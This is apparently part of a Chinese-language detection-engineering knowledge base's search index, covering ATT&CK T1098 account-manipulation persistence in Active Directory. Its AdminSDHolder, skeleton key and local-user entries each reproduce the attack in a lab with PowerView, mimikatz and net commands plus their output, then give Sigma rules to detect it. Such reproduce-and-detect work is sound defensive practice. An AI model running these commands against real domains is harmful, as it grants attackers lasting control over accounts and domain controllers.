\u7684\u6743\u9650\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>AdminSDHolder\u662f\u4e00\u4e2a\u7279\u6b8a\u7684AD\u5bb9\u5668\uff0c\u5177\u6709\u4e00\u4e9b\u9ed8\u8ba4\u5b89\u5168\u6743\u9650\uff0c\u7528\u4f5c\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\u7684\u6a21\u677f\u3002</p> <p>Active Directory\u5c06\u91c7\u7528AdminSDHolder\u5bf9\u8c61\u7684ACL\u5e76\u5b9a\u671f\u5c06\u5176\u5e94\u7528\u4e8e\u6240\u6709\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\uff0c\u4ee5\u9632\u6b62\u610f\u5916\u548c\u65e0\u610f\u7684\u4fee\u6539\u5e76\u786e\u4fdd\u5bf9\u8fd9\u4e9b\u5bf9\u8c61\u7684\u8bbf\u95ee\u662f\u5b89\u5168\u7684\u3002</p> <p>\u5982\u679c\u80fd\u591f\u4fee\u6539AdminSDHolder\u5bf9\u8c61\u7684ACL\uff0c\u90a3\u4e48\u4fee\u6539\u7684\u6743\u9650\u5c06\u81ea\u52a8\u5e94\u7528\u4e8e\u6240\u6709\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\uff0c\u8fd9\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u57df\u73af\u5883\u6743\u9650\u7ef4\u6301\u7684\u65b9\u6cd5\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#_4","title":"\u5b8c\u6574\u5229\u7528\u8fc7\u7a0b","text":"<p>1.\u679a\u4e3e\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\u4e2d\u7684\u4fe1\u606f</p> <p>\u67e5\u627e\u6709\u4ef7\u503c\u7684\u7528\u6237\uff0c\u9700\u8981\u786e\u8ba4\u8be5\u7528\u6237\u662f\u5426\u5c5e\u4e8e\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\uff0c\u6392\u9664\u66fe\u7ecf\u5c5e\u4e8e\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\u3002</p> <p>2.\u5411AdminSDHolder\u5bf9\u8c61\u6dfb\u52a0ACL</p> <p>\u4f8b\u5982\u6dfb\u52a0\u7528\u6237testa\u5bf9AdminSDHolder\u7684\u5b8c\u5168\u8bbf\u95ee\u6743\u9650\u3002</p> <p>\u9ed8\u8ba4\u7b49\u5f8560\u5206\u949f\u4ee5\u540e\uff0ctesta\u83b7\u5f97\u5bf9\u6240\u6709\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\u7684\u5b8c\u5168\u8bbf\u95ee\u6743\u9650\u3002</p> <p>\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u6ce8\u518c\u8868\u7684\u65b9\u5f0f\u8bbe\u7f6e\u6743\u9650\u63a8\u9001\u7684\u95f4\u9694\u65f6\u95f4\uff0c\u6ce8\u518c\u8868\u4f4d\u7f6e\u5982\u4e0b\uff1a</p> <pre><code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters,AdminSDProtectFrequency,REG_DWORD\n</code></pre> <p>\u4f8b\u5982\u4fee\u6539\u6210\u7b49\u5f85600\u79d2\u7684\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>reg add hklm\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters/v AdminSDProtectFrequency /t REG_DWORD/d 600\n</code></pre> <p>\u53c2\u8003\u8d44\u6599\uff1ahttps://blogs.technet.microsoft.com/askds/2009/05/07/five-common-questions-about-adminsdholder-and-sdprop/</p> <p>\u6ce8\uff1a\u4e0d\u5efa\u8bae\u964d\u4f4e\u9ed8\u8ba4\u95f4\u9694\u65f6\u95f4\uff0c\u56e0\u4e3a\u5728\u5927\u578b\u73af\u5883\u4e2d\u53ef\u80fd\u4f1a\u5bfc\u81f4LSASS\u6027\u80fd\u4e0b\u964d\u3002</p> <p>3.\u83b7\u5f97\u5bf9\u6574\u4e2a\u57df\u7684\u63a7\u5236\u6743\u9650</p> <p>(1)\u7528\u6237testa\u80fd\u591f\u5411\u57df\u7ba1\u7406\u5458\u7ec4\u6dfb\u52a0\u5e10\u6237\u3002</p> <p>\u9a8c\u8bc1\u6743\u9650\u7684\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>Import-Module .\\PowerView.ps1\nGet-ObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs | ?{$_.IdentityReference-match'xiaomi'}\n</code></pre> <p>(2)\u7528\u6237testa\u80fd\u591f\u76f4\u63a5\u8bbf\u95ee\u57df\u63a7\u5236\u5668\u4e0a\u7684\u6587\u4ef6\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#_5","title":"\u6d4b\u8bd5\u8fc7\u7a0b","text":"<p>1.\u67e5\u8be2AdminSDHolder\u5bf9\u8c61\u7684ACL \u67e5\u8be2AdminSDHolder\u5bf9\u8c61\u7684ACL\u7b49\u4ef7\u4e8e\u67e5\u8be2\"CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org\"\u7684ACL\u3002</p> <p>\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>Import-Module .\\PowerView.ps1\nGet-ObjectAcl -ADSprefix \"CN=AdminSDHolder,CN=System\"|select IdentityReference\n</code></pre> <p>\u771f\u5b9e\u6d4b\u8bd5\u60c5\u51b5</p> <pre><code>PS C:\\Users\\Administrator\\Desktop\\mimikatz_trunk&gt; Import-Module .\\PowerView.ps1\nPS C:\\Users\\Administrator\\Desktop\\mimikatz_trunk&gt; Get-ObjectAcl -ADSprefix \"CN=AdminSDHolder,CN=System\"|select IdentityR\neference\n\nIdentityReference\n-----------------\nNT AUTHORITY\\Authenticated Users\nNT AUTHORITY\\SYSTEM\nBUILTIN\\Administrators\nXIAOMI\\Domain Admins\nXIAOMI\\Enterprise Admins\nEveryone\nNT AUTHORITY\\SELF\nNT AUTHORITY\\SELF\nBUILTIN\\Pre-Windows 2000 Compatible Access\nBUILTIN\\Pre-Windows 2000 Compatible Access\nBUILTIN\\Pre-Windows 2000 Compatible Access\nBUILTIN\\Pre-Windows 2000 Compatible Access\nBUILTIN\\Pre-Windows 2000 Compatible Access\nBUILTIN\\Pre-Windows 2000 Compatible Access\nBUILTIN\\Pre-Windows 2000 Compatible Access\nBUILTIN\\Pre-Windows 2000 Compatible Access\nBUILTIN\\Pre-Windows 2000 Compatible Access\nBUILTIN\\Pre-Windows 2000 Compatible Access\nBUILTIN\\Pre-Windows 2000 Compatible Access\nBUILTIN\\Windows Authorization Access Group\nBUILTIN\\Terminal Server License Servers\nBUILTIN\\Terminal Server License Servers\nXIAOMI\\Cert Publishers\n</code></pre> <p>2.\u5411AdminSDHolder\u5bf9\u8c61\u6dfb\u52a0ACL</p> <p>\u6dfb\u52a0\u7528\u6237xiaomi\u7684\u5b8c\u5168\u8bbf\u95ee\u6743\u9650\uff0c\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>Import-Module .\\PowerView.ps1\nAdd-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName xiaomi -Verbose -Rights All\n</code></pre> <p>\u6ce8\u610f:\u672c\u6587\u63d0\u5230\u7684\u767e\u5ea6\u793e\u533a\u53c2\u8003\u94fe\u63a5\u6b64\u5904\u5b58\u5728\u95ee\u9898\u3002\u662fRights\u4e0d\u662f\u6587\u4e2d\u63d0\u5230\u7684Right</p> <p>\u771f\u5b9e\u6d4b\u8bd5\u60c5\u51b5</p> <pre><code>PS C:\\Users\\Administrator\\Desktop\\mimikatz_trunk&gt; Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -Principal\nSamAccountName xiaomi -Verbose -Rights All\n\u8be6\u7ec6\u4fe1\u606f: Get-DomainSearcher search string: LDAP://CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org\n\u8be6\u7ec6\u4fe1\u606f: Get-DomainSearcher search string: LDAP://DC=xiaomi,DC=org\n\u8be6\u7ec6\u4fe1\u606f: Granting principal S-1-5-21-3576461989-1381017913-248049510-1104 'All' on\nCN=AdminSDHolder,CN=System,DC=xiaomi,DC=org\n\u8be6\u7ec6\u4fe1\u606f: Granting principal S-1-5-21-3576461989-1381017913-248049510-1104 '00000000-0000-0000-0000-000000000000'\nrights on CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org\n</code></pre> <p>3.\u9a8c\u8bc1\u7528\u6237\u6743\u9650</p> <p>\u7b49\u5f85\u516d\u5341\u5206\u949f\u540e\uff0c\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u67e5\u8be2\u7528\u6237xiaomi\u7684\u6743\u9650\uff1a</p> <pre><code>Import-Module .\\PowerView.ps1\nGet-ObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs | ?{$_.IdentityReference-match'xiaomi'}\nOR\nGet-ObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs | select IdentityReference\n</code></pre> <p>4.\u5220\u9664AdminSDHolder\u4e2d\u6307\u5b9a\u7528\u6237\u7684ACL</p> <p>\u641c\u7d22\u6761\u4ef6\u4e3a\"LDAP://CN=AdminSDHolder,CN=System,DC=test,DC=com\"</p> <p>\u5220\u9664\u7528\u6237xiaomi\u7684\u5b8c\u5168\u8bbf\u95ee\u6743\u9650\uff0c\u547d\u4ee4\u5982\u4e0b\uff08\u6267\u884c\u5931\u8d25\uff09\uff1a</p> <pre><code>Remove-DomainObjectAcl -TargetSearchBase \"LDAP://CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org\" -PrincipalIdentity xiaomi -Rights All -Verbose\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#_6","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows\u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#_7","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#sigma","title":"Sigma\u89c4\u5219","text":"<pre><code>title: Windows-AdminSDHolder\ndescription: Windows server 2008 R2\uff08AD\u57df\u63a7\uff09\nreferences: \n    - https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md\n    - https://github.com/0Kee-Team/WatchAD/blob/master/modules/detect/event_log/persistence/AdminSDHolder.py\ntags: 1098\nstatus: \u6d4b\u8bd5\u9636\u6bb5 \nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 5136  #\u5df2\u4fee\u6539\u76ee\u5f55\u670d\u52a1\u5bf9\u8c61\u3002AdminSDHolder\u66f4\u6539\uff0c\u4e00\u822c\u7528\u4f5c\u6743\u9650\u7ef4\u6301\uff0c\u56e0\u4e3a\u66f4\u6539\u60c5\u51b5\u6781\u5c11\n    selection2:\n        EventID: 4780  #ACL\u8bbe\u7f6e\u5728\u7ba1\u7406\u5458\u7ec4\u6210\u5458\u7684\u5e10\u6237\u4e0a\n    timeframe: last 1h #\u9ed8\u8ba4\u7b49\u5f8560\u5206\u949f\u4e4b\u540e\u751f\u6548\uff0c\u5177\u4f53\u539f\u56e0\u53ef\u53c2\u8003\u4e0b\u9762SDPROP\u8bf4\u660e\n    condition: all of them\nlevel: medium\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#_8","title":"\u5efa\u8bae","text":"<p>\u65e0</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-AdminSDHolder/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>\u57df\u6e17\u900f\u2014\u2014AdminSDHolder</p> <p>https://anquan.baidu.com/article/877</p> <p>PowerView</p> <p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</p> <p>SDPROP\u8bf4\u660e</p> <p>https://xz.aliyun.com/t/7276</p> <p>MITRE-ATT&amp;CK-T1098</p> <p>https://attack.mitre.org/techniques/T1098/</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/","title":"T1098-win-\u4e07\u80fd\u5bc6\u7801","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5e10\u6237\u64cd\u4f5c\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u7ef4\u6301\u5728\u53d7\u5bb3\u8005\u73af\u5883\u4e2d\u5bf9\u51ed\u636e\u6216\u67d0\u4e9b\u6743\u9650\u7ea7\u522b\u7684\u8bbf\u95ee\u6743\u9650\u3002\u8d26\u6237\u64cd\u4f5c\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u6743\u9650\uff0c\u4fee\u6539\u51ed\u636e\uff0c\u6dfb\u52a0\u6216\u66f4\u6539\u6743\u9650\u7ec4\uff0c\u4fee\u6539\u5e10\u6237\u8bbe\u7f6e\u6216\u4fee\u6539\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u7b49\u65b9\u5f0f\u3002\u4e3a\u4e86\u521b\u5efa\u6216\u64cd\u7eb5\u5e10\u6237\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4f7f\u7528\u4e07\u80fd\u5bc6\u7801\uff08skeleton key\uff09\uff0c\u53ef\u4ee5\u5bf9\u57df\u5185\u6743\u9650\u8fdb\u884c\u6301\u4e45\u5316\u64cd\u4f5c\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#1pc","title":"\u6b65\u9aa41\uff08PC\u4e0a\u6267\u884c\uff0c\u666e\u901a\u57df\u7528\u6237\u6743\u9650\uff09","text":"<pre><code>C:\\Users\\xiaomi&gt;dir \\\\dc.xiaomi.org\\c$  \n\u62d2\u7edd\u8bbf\u95ee\u3002\n\nC:\\Users\\xiaomi&gt;net use \\\\dc.xiaomi.org\\ipc$ \"admin.098\" /user:xiaomi\\administra\ntor\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n\nC:\\Users\\xiaomi&gt;dir \\\\dc.xiaomi.org\\c$\n \u9a71\u52a8\u5668 \\\\dc.xiaomi.org\\c$ \u4e2d\u7684\u5377\u6ca1\u6709\u6807\u7b7e\u3002\n \u5377\u7684\u5e8f\u5217\u53f7\u662f 50E9-7D0C\n\n \\\\dc.xiaomi.org\\c$ \u7684\u76ee\u5f55\n\n2009/07/14  11:20    &lt;DIR&gt;          PerfLogs\n2020/03/23  15:24    &lt;DIR&gt;          Program Files\n2020/03/23  15:24    &lt;DIR&gt;          Program Files (x86)\n2020/03/23  14:47    &lt;DIR&gt;          Users\n2020/03/23  15:30    &lt;DIR&gt;          Windows\n               0 \u4e2a\u6587\u4ef6              0 \u5b57\u8282\n               5 \u4e2a\u76ee\u5f55 32,728,838,144 \u53ef\u7528\u5b57\u8282\n\nC:\\Users\\xiaomi&gt;net use\n\u4f1a\u8bb0\u5f55\u65b0\u7684\u7f51\u7edc\u8fde\u63a5\u3002\n\n\n\u72b6\u6001       \u672c\u5730        \u8fdc\u7a0b                      \u7f51\u7edc\n\n-------------------------------------------------------------------------------\nOK                     \\\\dc.xiaomi.org\\ipc$      Microsoft Windows Network\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n\n\nC:\\Users\\xiaomi&gt;net use \\\\dc.xiaomi.org\\ipc$ /del /y\n\\\\dc.xiaomi.org\\ipc$ \u5df2\u7ecf\u5220\u9664\u3002\n\n\nC:\\Users\\xiaomi&gt;net use\n\u4f1a\u8bb0\u5f55\u65b0\u7684\u7f51\u7edc\u8fde\u63a5\u3002\n\n\u5217\u8868\u662f\u7a7a\u7684\u3002\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#2dc","title":"\u6b65\u9aa42\uff08DC\u4e0a\u6267\u884c\uff0c\u7ba1\u7406\u5458\u6743\u9650\uff09","text":"<pre><code>C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64&gt;mimikatz.exe \"privilege::debug\n\" \"misc::skeleton\" exit\n\n  .#####.   mimikatz 2.1.1 (x64) built on Apr  9 2017 23:24:20\n .## ^ ##.  \"A La Vie, A L'Amour\"\n ## / \\ ##  /* * *\n ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)\n  '#####'                                     with 21 modules * * */\n\nmimikatz(commandline) # privilege::debug\nPrivilege '20' OK\n\nmimikatz(commandline) # misc::skeleton\n[KDC] data\n[KDC] struct\n[KDC] keys patch OK\n[RC4] functions\n[RC4] init patch OK\n[RC4] decrypt patch OK\n\nmimikatz(commandline) # exit\nBye!\n</code></pre> <p>\u7cfb\u7edf\u63d0\u793aSkeleton Key\u5df2\u7ecf\u6ce8\u5165\u6210\u529f\u3002\u6b64\u65f6\uff0c\u4f1a\u5728\u57df\u5185\u7684\u6240\u6709\u8d26\u6237\u4e2d\u6dfb\u52a0\u4e00\u4e2aSkeleton key\uff0c\u5176\u5bc6\u7801\u9ed8\u8ba4\u4e3a\u201cmimikatz\u201d\u3002\u63a5\u4e0b\u6765\u53ef\u4ee5\u4ee5\u57df\u5185\u4efb\u4f55\u7528\u6237\u7684\u8eab\u4efd\uff0c\u914d\u5408\u8be5Skeleton Key\uff0c\u8fdb\u884c\u57df\u5185\u8eab\u4efd\u6388\u6743\u9a8c\u8bc1\u4e86\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#3pc","title":"\u6b65\u9aa43\uff08PC\u4e0a\u6267\u884c\uff0c\u666e\u901a\u57df\u7528\u6237\u6743\u9650\uff09","text":"<pre><code>C:\\Users\\xiaomi&gt;net use \\\\dc.xiaomi.org\\ipc$ \"mimikatz\" /user:xiaomi\\administrat\nor\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n\n\nC:\\Users\\xiaomi&gt;dir \\\\dc.xiaomi.org\\c$\n \u9a71\u52a8\u5668 \\\\dc.xiaomi.org\\c$ \u4e2d\u7684\u5377\u6ca1\u6709\u6807\u7b7e\u3002\n \u5377\u7684\u5e8f\u5217\u53f7\u662f 50E9-7D0C\n\n \\\\dc.xiaomi.org\\c$ \u7684\u76ee\u5f55\n\n2009/07/14  11:20    &lt;DIR&gt;          PerfLogs\n2020/03/23  15:24    &lt;DIR&gt;          Program Files\n2020/03/23  15:24    &lt;DIR&gt;          Program Files (x86)\n2020/03/23  14:47    &lt;DIR&gt;          Users\n2020/03/23  15:30    &lt;DIR&gt;          Windows\n               0 \u4e2a\u6587\u4ef6              0 \u5b57\u8282\n               5 \u4e2a\u76ee\u5f55 32,758,198,272 \u53ef\u7528\u5b57\u8282\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows\u5b89\u5168\u4e8b\u4ef6ID\uff0c\u591a\u4e8b\u4ef6\u5173\u8054\u5206\u6790</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#sigma","title":"Sigma\u89c4\u5219","text":"<pre><code>title: Windows \u4e07\u80fd\u5bc6\u7801\ndescription: Windows server 2008 R2\\win 7\nreferences: https://0xsp.com/ad-attack-or-defense/ad-ttps-list\ntags: T1098\nstatus: \u6d4b\u8bd5\u9636\u6bb5\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4673  #\u8c03\u7528\u6743\u9650\u7684\u670d\u52a1\n    selection2:\n        EventID: 4611  #\u53d7\u4fe1\u4efb\u7684\u767b\u5f55\u8fdb\u7a0b\u5df2\u5728\u672c\u5730\u5b89\u5168\u673a\u6784\u6ce8\u518c\n    selection3:\n        EventID: 4688  #\u65b0\u8fdb\u7a0b\u521b\u5efa\n    selection4:\n        EventID: 4689  #\u9000\u51fa\u8fdb\u7a0b\n    condition: all of them\n    timeframe: last 5s\nlevel: medium\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_6","title":"\u5efa\u8bae","text":"<p>\u4ee5\u4e0a\u89c4\u5219\u5b58\u5728\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4e0d\u7a33\u5b9a\u6027\uff0c\u8c28\u614e\u4f7f\u7528\uff01</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1098</p> <p>https://attack.mitre.org/techniques/T1098/</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/","title":"T1098-win-\u8d26\u6237\u64cd\u4f5c","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5e10\u6237\u64cd\u4f5c\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u7ef4\u6301\u5728\u73af\u5883\u4e2d\u5bf9\u51ed\u636e\u548c\u67d0\u4e9b\u6743\u9650\u7ea7\u522b\u7684\u8bbf\u95ee\u3002\u8d26\u6237\u64cd\u4f5c\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u6743\u9650\uff0c\u4fee\u6539\u51ed\u636e\uff0c\u6dfb\u52a0\u6216\u66f4\u6539\u6743\u9650\u7ec4\uff0c\u4fee\u6539\u5e10\u6237\u8bbe\u7f6e\u6216\u4fee\u6539\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u7b49\u65b9\u5f0f\u3002\u4e3a\u4e86\u521b\u5efa\u6216\u64cd\u7eb5\u5e10\u6237\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4f7f\u7528windows\u7cfb\u7edf\u81ea\u8eab\u7684\u4e00\u4e9b\u5b89\u5168\u8fdb\u7a0b\uff08CMD/Powershell\u7b49\uff09\u6765\u6267\u884c\u8fd9\u4e9b\u64cd\u4f5c\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528\u4e00\u4e9b\u7ecf\u5178\u7684\u5de5\u5177\u6765\u8fdb\u884c\u8d26\u6237\u64cd\u4f5c\uff08mimikatz\u7b49\uff09\u3002\u524d\u63d0\u662f\u4f60\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u8005\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>C:\\Windows\\system32&gt;net user test321 Test.321 /add\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows\u5b89\u5168\u4e8b\u4ef6ID\uff0c\u591a\u4e8b\u4ef6\u5173\u8054\u5206\u6790</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#sigma","title":"Sigma\u89c4\u5219","text":"<pre><code>title: Net.exe\u521b\u5efa\u672c\u5730\u7528\u6237\nstatus: \u6d4b\u8bd5\u9636\u6bb5\ndescription: \u901a\u8fc7\u521b\u5efa\u672c\u5730\u7528\u6237net.exe\u6587\u4ef6\u547d\u4ee4\ntags:\n    - attack.t1098\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Eventid:\n            - 4688 #\u8fdb\u7a0b\u521b\u5efa\uff0cwindows \u5b89\u5168\u65e5\u5fd7\uff0cWindows server 2012\u53ca\u4ee5\u4e0a\u7248\u672c\u914d\u7f6e\u76f8\u5173\u5ba1\u6838\u7b56\u7565\uff0c\u53ef\u8bb0\u5f55\u7cfb\u7edf\u547d\u4ee4\u884c\u53c2\u6570\n            - 1    #\u8fdb\u7a0b\u521b\u5efa\uff0cWindows sysmon\u65e5\u5fd7\uff0c\u9700\u8981\u81ea\u884c\u5b89\u88c5\u5e76\u914d\u7f6esysmon\n        Image|endswith: \n            - '\\net.exe'\n            - '\\net1.exe'\n        CommandLine|contains|all: \n            - 'user'\n            - 'add'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legit user creation\n    - Better use event ids for user creation rather than command line rules\nlevel: medium\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_6","title":"\u5efa\u8bae","text":"<p>\u65e0</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1098</p> 